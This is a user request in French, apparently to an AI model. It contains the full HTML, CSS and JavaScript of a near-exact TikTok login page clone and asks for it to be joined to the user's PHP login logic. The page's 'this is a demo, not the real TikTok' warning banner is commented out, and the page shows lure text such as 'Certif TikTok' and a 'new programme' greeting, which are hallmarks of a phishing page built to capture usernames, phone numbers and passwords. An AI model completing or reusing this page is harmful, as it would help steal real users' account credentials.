@@ -1,0 +1,310 @@
+bon , je voulais impressioner mon prof de style css et html avec mes capacites de copieur en asant une reporduction exacte de la page deconnexion de tiktok (et en remplacant le style par celle que j'a vais faite avatn) , mais cette reproduction exactement que j'ai faite la maintenant la est faite en html css js pure alors je ne l'ai pas integre a ma logique php de l'encienne et tout , et la je me retrouve a devoir reecrire l'ancienne a la maniere de la nouvelle car c'est l'ancinne qui a ma logique php alors toi comme tu es une IA reecire du code en l'adaptant pour qu;il conteune de bien marcher c;est ton dada (email ou tlelphone ca doit paaase ccomme username ) , re f tu peux tout arranger je le sais repete du code si il le faut car je veux juse avoir a remplacer mon code par le tiens ,
+
+pour t'aider je ete donne plus de detail avec le code html css js  de ma nouvelle reprod et le code de l'ancienne (fais gaffe a ne pas teop chambouler les choses ) :
+
+bon voila le html css js de ma reproduction nouvlle :
+
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login TikTok - Page de connexion</title>
+    <!--favicon-->
+    <link rel="shortcut icon" type="image/x-icon" href="favicon.webp">
+    <!-- Bootstrap CSS -->
+    <!-- Font Awesome CSS -->
+    <link rel="stylesheet" href="style.css">
+    <!-- Avertissement clair que c'est une démo -->
+    <style>
+        .demo-banner {
+            background-color: #ff4d4d;
+            color: white;
+            text-align: center;
+            padding: 10px;
+            position: fixed;
+            top: 0;
+            width: 100%;
+            z-index: 1000;
+        }
+    </style>
+</head>
+<body>
+    <!-- <div class="demo-banner">
+        Ceci est une DÉMO - PAS le vrai TikTok!
+    </div> -->
+    <div class="container">
+        <div class="login-box">
+            <img src="https://sf16-scmcdn-va.ibytedtos.com/goofy/tiktok/web/node/_next/static/images/logo-dark-e95da587b6efa1520dcd11f4b45c0cf6.svg" alt="TikTok Logo" class="logo">
+            <h1 style="margin-bottom: 3px;">Connexion</h1>
+            <h5 style="text-align: center;">Bienvenue dans notre nouveau programme</h5>
+
+            
+            <div class="login-options">
+                <button class="option-btn active" data-option="email">E-mail ou nom d'utilisateur</button>
+                <button class="option-btn" data-option="phone">Numéro de téléphone</button>
+            </div>
+
+            <form id="loginForm">
+                <div class="input-group">
+                    <input type="text" id="username" placeholder="E-mail ou nom d'utilisateur" required>
+                </div>
+                
+                <div class="input-group password-group">
+                    <input type="password" id="password" placeholder="Mot de passe" required>
+                    <button type="button" class="toggle-password">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" class="eye-icon">
+                            <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
+                        </svg>
+                    </button>
+                </div>
+
+                <a href="#" class="forgot-password">Mot de passe oublié ?</a>
+                
+                <button type="submit" class="login-btn">Connexion</button>
+            </form>
+
+            <div class="signup-link">
+                Tu n'as pas de compte ? <a href="#">Inscription</a>
+            </div>
+
+            <div class="footer">
+                <select class="language-select">
+                    <option value="fr">Français</option>
+                    <option value="en">English</option>
+                </select>
+                <p class="copyright">© 2025 Certif TikTok</p>
+            </div>
+        </div>
+    </div>
+    <script src="script.js"></script>
+</body>
+</html>
+
+
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+}
+
+body {
+    background-color: #fff;
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+}
+
+.container {
+    width: 100%;
+    max-width: 420px;
+    margin-top: 50px; /* Pour la bannière demo */
+}
+
+.login-box {
+    background: #fff;
+    padding: 48px 36px;
+    border-radius: 8px;
+    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+}
+
+.logo {
+    width: 118px;
+    height: 42px;
+    margin: 0 auto 24px;
+    display: block;
+}
+
+h1 {
+    font-size: 24px;
+    color: #161823;
+    text-align: center;
+    margin-bottom: 32px;
+    font-weight: 700;
+}
+
+.login-options {
+    display: flex;
+    justify-content: space-between;
+    margin-bottom: 24px;
+    border-bottom: 1px solid #f1f1f2;
+}
+
+.option-btn {
+    background: none;
+    border: none;
+    padding: 12px 8px;
+    color: #161823;
+    font-size: 15px;
+    cursor: pointer;
+    opacity: 0.7;
+    position: relative;
+}
+
+.option-btn.active {
+    opacity: 1;
+    font-weight: 600;
+}
+
+.option-btn.active::after {
+    content: '';
+    position: absolute;
+    bottom: -1px;
+    left: 0;
+    width: 100%;
+    height: 2px;
+    background-color: #fe2c55;
+}
+
+.input-group {
+    margin-bottom: 16px;
+    position: relative;
+}
+
+input {
+    width: 100%;
+    padding: 14px;
+    border: 1px solid #e3e3e4;
+    border-radius: 4px;
+    font-size: 15px;
+    background-color: #f1f1f2;
+    transition: border-color 0.3s;
+}
+
+input:focus {
+    outline: none;
+    border-color: #fe2c55;
+    background-color: #fff;
+}
+
+.password-group {
+    position: relative;
+}
+
+.toggle-password {
+    position: absolute;
+    right: 12px;
+    top: 50%;
+    transform: translateY(-50%);
+    background: none;
+    border: none;
+    cursor: pointer;
+    padding: 4px;
+}
+
+.eye-icon {
+    width: 20px;
+    height: 20px;
+    opacity: 0.5;
+}
+
+.forgot-password {
+    display: block;
+    text-align: right;
+    color: #161823;
+    text-decoration: none;
+    font-size: 14px;
+    margin: 8px 0 24px;
+}
+
+.login-btn {
+    width: 100%;
+    padding: 14px;
+    background-color: #fe2c55;
+    color: white;
+    border: none;
+    border-radius: 4px;
+    font-size: 16px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: background-color 0.3s;
+}
+
+.login-btn:hover {
+    background-color: #ef2950;
+}
+
+.signup-link {
+    text-align: center;
+    margin-top: 24px;
+    font-size: 15px;
+    color: #161823;
+}
+
+.signup-link a {
+    color: #fe2c55;
+    text-decoration: none;
+    font-weight: 600;
+}
+
+.footer {
+    margin-top: 48px;
+    text-align: center;
+}
+
+.language-select {
+    padding: 8px;
+    border: none;
+    background: none;
+    font-size: 14px;
+    color: #161823;
+    cursor: pointer;
+}
+
+.copyright {
+    margin-top: 8px;
+    font-size: 12px;
+    color: #8a8b91;
+}
+
+@media (max-width: 480px) {
+    .login-box {
+        padding: 32px 20px;
+    }
+    
+    .option-btn {
+        font-size: 14px;
+    }
+}
+
+// Gestion des onglets de connexion
+document.querySelectorAll('.option-btn').forEach(button => {
+    button.addEventListener('click', () => {
+        // Retirer la classe active de tous les boutons
+        document.querySelectorAll('.option-btn').forEach(btn => {
+            btn.classList.remove('active');
+        });
+        
+        // Ajouter la classe active au bouton cliqué
+        button.classList.add('active');
+        
+        // Changer le placeholder de l'input en fonction de l'option
+        const usernameInput = document.getElementById('username');
+        if (button.dataset.option === 'phone') {
+            usernameInput.placeholder = 'Numéro de téléphone';
+            usernameInput.type = 'tel';
+        } else {
+            usernameInput.placeholder = 'E-mail ou nom d\'utilisateur';
+            usernameInput.type = 'text';
+        }
+    });
+});
+
+// Gestion de l'affichage/masquage du mot de passe
+const togglePassword = document.querySelector('.toggle-password');
+const passwordInput = document.getElementById('password');
+
+togglePassword.addEventListener('click', () => {
+    const type = passwordInput.type === 'password' ? 'text' : 'password';
+    passwordInput.type = type;
+    
+    // Changer l'icône (vous devrez ajouter vos propres icônes)
+    const eyeIcon = togglePassword.querySelector('.eye-icon');
+    eyeIcon.src = type === 'password' ? 'eye.svg' : 'eye-off.svg';
+});
+
+
+si tu es pret et que tu as retenu ceci tu me le dis juste et je te donne maintenant le code a adapter dans ce style trop beau 
